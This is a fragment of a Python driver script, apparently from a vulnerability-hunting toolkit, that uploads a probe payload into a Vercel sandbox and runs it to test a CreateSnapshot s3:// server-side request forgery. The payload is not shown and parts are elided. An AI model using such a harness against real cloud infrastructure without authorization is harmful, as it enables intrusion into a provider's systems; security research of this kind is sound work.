# -*- coding: utf-8 -*-
"""v194 驱动: 沙箱用户视角 23456 CreateSnapshot s3:// SSRF"""
...
NAME = 'v194'
PAY = r'D:\scan\skills\non-traditional-vuln-hunting\vda194_probe_user.py'
...
def main():
    ...
    inject(sid, '/vercel/sandbox/vda194_probe_user.py', open(PAY, 'rb').read())
    c, r = cmd(sid, 'python3', ['/vercel/sandbox/vda194_probe_user.py'], 120000)
    print('[run payload]', c)
    print((r or '')[:20000])
